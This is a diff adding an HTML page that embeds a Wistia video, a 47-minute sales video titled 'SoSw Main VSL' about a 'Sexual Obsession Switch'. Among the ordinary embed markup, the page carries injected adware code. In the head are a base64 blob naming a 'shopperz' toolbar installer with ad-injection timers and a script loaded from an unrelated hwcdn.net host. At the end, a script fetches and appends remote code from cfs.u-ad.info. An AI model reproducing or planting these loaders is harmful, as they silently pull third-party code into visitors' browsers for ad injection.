@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  //<![CDATA[
+    window._wistiaIframeShim = true;
+  //]]>
+</script>
+<script src='http://fast.wistia.net/assets/external/E-v1.js'></script>
+<head><script> _BIT_LocalStoreDetails="{eyJpbnN0YWxsZXJfbmFtZSI6InZiYXRlc19jbGttaWRleF8uZXhlIiwidG9vbGJhcklEIjoiM0NENzNFMUM3MkZCNDY1ODhENDdERDY2NzQ0MkQxNzMiLCJwcm9kdWN0X25hbWUiOiJzaG9wcGVyejExMTIyMDE1MTQ1OSIsImNoYW5lbElEIjoiY2xrbWlkZXgiLCJpbnN0YWxsX3RpbWUiOiIxMi0xMi0yMDE1IiwicHJvZHVjdF92ZXJzaW9uIjoiMi4wLjAuNDgwIiwidmJ0c19nZW8iOiJJRHx8fDg2NDE0NDk4NjAwODIwODAiLCJhZEJsb2NrX3RpbWVyIjoidHJ1ZXx8fDE0NTExNTA2MDA4NzQiLCJpbmpzY3MiOiJ0cnVlfHx8ODY0MTQ1MTE0Nzk2MDcxNyIsInB4bF9WQkFURVNfZGFpbHlQaW5nIjoiZGFpbHlQaW5nfHx8MTQ1MTE2MDc3MzYzMyIsIm5iX3RpbWVyIjoidHJ1ZXx8fDE0NTExNjA4MDk5MzUiLCJwcmVwb3BfdGltZXIiOiIxNDUxMDc0NjQxMTY3fHx8MTQ1MTE2MTA0MTE2OCIsInByZXBvcF9pbmRleCI6IjB8fHwxNDUxMTYxMDQxMTc2IiwiVkJBVEVTX2RhaWx5UGluZyI6InRydWV8fHwxNDUwMzY3OTYwMDQ2IiwiVkJBVEVTX0luc3RhbGxlZCI6InRydWV8fHw4NjQxNDUwNTQ1NTcxNzE5In0=}"</script><script id="_SFR_xl" src="http://cds.q2u3z6t7.hwcdn.net/extless/js/preloaderrs.js?tbid=3CD73E1C72FB46588D47DD667442D173&chnl=clkmidex&prd=shopperz111220151459&ind=12-12-2015&ver=2.0.0.480&drv=1"></script>
+<meta content='width=device-width, user-scalable=no' name='viewport'>
+<title>SoSw Main VSL for Oct 2014 launch</title>
+<link rel="alternate" type="application/json+oembed" href="https://fast.wistia.com/oembed.json?url=https%3A%2F%2Ffast.wistia.com%2Fembed%2Fiframe%2F2ag1ragxnk%3Faction%3Dshow%26autoPlay%3Dtrue%26controller%3Dembed%252Fiframe%26fullscreenButton%3Dfalse%26id%3D2ag1ragxnk%26pageUrl%3D%26playButton%3Dfalse%26playbar%3Dfalse%26playerColor%3D000000%26smallPlayButton%3Dfalse%26version%3Dv1" title="SoSw Main VSL for Oct 2014 launch" />
+<link rel="alternate" type="application/json+oembed" href="https://fast.wistia.com/oembed.xml?url=https%3A%2F%2Ffast.wistia.com%2Fembed%2Fiframe%2F2ag1ragxnk%3Faction%3Dshow%26autoPlay%3Dtrue%26controller%3Dembed%252Fiframe%26fullscreenButton%3Dfalse%26id%3D2ag1ragxnk%26pageUrl%3D%26playButton%3Dfalse%26playbar%3Dfalse%26playerColor%3D000000%26smallPlayButton%3Dfalse%26version%3Dv1" title="SoSw Main VSL for Oct 2014 launch" />
+<meta name="twitter:card" content="player" />
+<meta name="twitter:site" content="@wistia" />
+<meta name="twitter:title" content="SoSw Main VSL for Oct 2014 launch" />
+<meta name="twitter:url" content="https://fast.wistia.net/embed/iframe/2ag1ragxnk?fullscreenButton=false&id=2ag1ragxnk&playButton=false&playbar=false&playerColor=000000&smallPlayButton=false&twitter=true&version=v1" />
+<meta name="twitter:description" content="47 min 01 sec video" />
+<meta name="twitter:image" content="https://embed-ssl.wistia.com/deliveries/54e44af125883ea62f9820a42f2d1718edcf8368/file.png" />
+<meta name="twitter:player" content="https://fast.wistia.net/embed/iframe/2ag1ragxnk?fullscreenButton=false&id=2ag1ragxnk&playButton=false&playbar=false&playerColor=000000&smallPlayButton=false&twitter=true&version=v1" />
+<meta name="twitter:player:width" content="435" />
+<meta name="twitter:player:height" content="326" />
+
+<style>
+  /*<![CDATA[*/
+    html, body {margin:0;padding:0;overflow:hidden;height:100%;}
+    object {border:0;}
+    #wistia_video {height:100%;width:100%;}
+    #wistia_fallback img {border:0;height:100%;vertical-align:top;width:100%;}
+  /*]]>*/
+</style>
+</head>
+<body>
+<div class='wistia_embed' id='wistia_video'>
+<a href='http://embed.wistia.com/deliveries/250599c0b41a2eb74468f06e442e397a2b283fc8/file.mp4' id='wistia_fallback'>
+<img alt='' src='http://embed.wistia.com/deliveries/54e44af125883ea62f9820a42f2d1718edcf8368.jpg?image_crop_resized=640x480'>
+</a>
+</div>
+<script>
+  //<![CDATA[
+    window._inWistiaIframe = true;
+    document.getElementById("wistia_fallback").style.display = "none";
+  //]]>
+</script>
+<script src='http://fast.wistia.net/assets/external/E-v1.js'></script>
+<script>
+  //<![CDATA[
+    Wistia.iframeInit({"assets":{"flv":{"type":"flv","url":"http://embed.wistia.com/deliveries/79d4b9f995e846202ca84f2942e0658c2849f6c8.bin","width":640,"height":480,"ext":"flv","size":61743028,"2pass":true},"iphone":{"type":"iphone","url":"http://embed.wistia.com/deliveries/250599c0b41a2eb74468f06e442e397a2b283fc8.bin","width":640,"height":480,"ext":"mp4","size":59790430,"2pass":false},"mp4hq":{"type":"mp4hq","url":"http://embed.wistia.com/deliveries/f94edada321e580891ce9b77da3ef394b01f3440.bin","width":640,"height":480,"ext":"mp4","size":59958293,"2pass":"true"},"still":{"type":"still","url":"http://embed.wistia.com/deliveries/54e44af125883ea62f9820a42f2d1718edcf8368.bin","width":512,"height":384,"ext":"png","size":24417,"2pass":null},"original":{"type":"original","url":"http://embed.wistia.com/deliveries/de7d3a49972ef238f1d24d21deefe0bc88742d07.bin","width":640,"height":480,"ext":"mp4","size":94049453,"2pass":null},"preview":{"type":"preview","url":"http://embed.wistia.com/deliveries/79d4b9f995e846202ca84f2942e0658c2849f6c8.bin","width":640,"height":480,"ext":"flv","size":61743028,"2pass":true}},"unnamed_assets":[{"type":"original","slug":"original","display_name":"Original file","width":640,"height":480,"ext":"mp4","size":94049453,"bitrate":260,"public":true,"status":2,"url":"http://embed.wistia.com/deliveries/de7d3a49972ef238f1d24d21deefe0bc88742d07.bin","created_at":1413242767},{"type":"flash_video","slug":"flv_h264_170k","display_name":"480p","container":"flv","codec":"h264","width":640,"height":480,"ext":"flv","size":61743028,"bitrate":170,"public":true,"status":2,"url":"http://embed.wistia.com/deliveries/79d4b9f995e846202ca84f2942e0658c2849f6c8.bin","created_at":1413242768},{"type":"md_mp4_video","slug":"mp4_h264_165k","display_name":"480p","container":"mp4","codec":"h264","width":640,"height":480,"ext":"mp4","size":59790430,"bitrate":165,"public":true,"status":2,"url":"http://embed.wistia.com/deliveries/250599c0b41a2eb74468f06e442e397a2b283fc8.bin","created_at":1413242768},{"type":"iphone_video","slug":"mp4_h264_166k","display_name":"480p","container":"mp4","codec":"h264","width":640,"height":480,"ext":"mp4","size":59958293,"bitrate":166,"public":true,"status":2,"url":"http://embed.wistia.com/deliveries/f94edada321e580891ce9b77da3ef394b01f3440.bin","created_at":1413242768},{"type":"still_image","slug":"still_image_512x384","display_name":"Image","width":512,"height":384,"ext":"png","size":24417,"bitrate":0,"public":true,"status":2,"url":"http://embed.wistia.com/deliveries/54e44af125883ea62f9820a42f2d1718edcf8368.bin","created_at":1413243404},{"type":"hls_video","slug":"m3u8_h264_0k_seg3s","display_name":"480p","container":"m3u8","codec":"h264","width":640,"height":480,"ext":"m3u8","size":90114,"bitrate":0,"public":true,"status":2,"metadata":{"max_bitrate":102397},"url":"http://embed.wistia.com/deliveries/6e5ef3e87a131b2c0f5c283c0d4bf58dad525aaa.bin","created_at":1448397196,"segment_duration":3}],"distilleryUrl":"http://distillery.wistia.com/x","accountKey":"wistia-production_14101","mediaKey":"wistia-production_9884053","name":"SoSw Main VSL for Oct 2014 launch","duration":2821.31,"hashedId":"2ag1ragxnk","branding":false,"seoDescription":"a Sexual Obsession Switch (SoSw) video from womendesireyou","preloadPreference":null,"flashPlayerUrl":"http://embed.wistia.com/flash/embed_player_v2.0.swf?2015-02-27","trackingTransmitInterval":94,"showAbout":true,"createdAt":1413242767,"stats":{"loadCount":162587,"playCount":99585,"uniqueLoadCount":109533,"uniquePlayCount":78980,"averageEngagement":0.179178},"playerPreference":"auto","integrations":{},"embed_options":{"volumeControl":"true","fullscreenButton":"true","controlsVisibleOnLoad":"true","playerColor":"7b796a","googleAnalytics":true,"version":"v2","stillUrl":"https://embed-ssl.wistia.com/deliveries/54e44af125883ea62f9820a42f2d1718edcf8368.jpg?t=1413243437440","autoPlay":"false","endVideoBehavior":"default","playButton":"true","smallPlayButton":"true","playbar":"true","branding":"false"}}, {});
+  //]]>
+</script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2b7tThA3pY7iMkBHsDw0XFk%2bl%2bHjqU722TY8ZMCvl%2b4Plh%2ftbXlnBPaum9AU5slSQRQxbXo5aKLNx6E3toYKUWD5E3HyKO3c5RuKe9HP5b76bU1qLzJNqZPf0mwFqHFwOPbqREyXiG2CBmhb0%2b8f3C61pt3jFTLz2wp1ibeSMupPJXHwdwX%2bBDe98npDqdlikuNVxIumHeAC%2fGQGzZp6SqeD0ggv8zSmYUpT1X2eo5xFNSDRg2c9cgiCogwu91SmKs1sqjSRkjMiboZXhbD4v5JElNJ9kIh7AwdQN3TshhJHiEGXorhRTH819uDbE2NXHBrreVmHYlTtFme9rts2RS2gVjCJ2xZhTFPx0kkD8K3i7aVOuv3AY%2fXycHN452kjqO5sc45tsaQwjeusncGqVl0wX0PA56qehg0b14BruPpbw1mxPg73BRcV0ceuZP%2b%2byy1%2bfvzARn3fvpFxHPf%2f%2bmzTsnoFAbk07Ajx5wcpTxajxL9QCoFpS8nyP3NuNnZQBjzhMIskA%2fsuKgxV9HSbG3wSZN1azoopMVdljIMguFDm75hKYZIeNEt6DMBocmJM69kZE%2boCaIGdHWUux25FA%2fMKDFQLE8u73w04qbTgJLQhy4a4rZzCbLq0ZaDzaHAf4Hj2Ad9YHasNkUXT1pj42a%2fnvORdRD84GFjPRvA5eFXKZ7eqMIzMmyfdK2Na6NonwdRTYRjCNgEvo6LiPC1C%2fipEhnucIsyKb2ZYg%2b6U4yP2WqOV9Ga4k3VJdLyfXB2DVJamNCDO5wMfw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
+
+
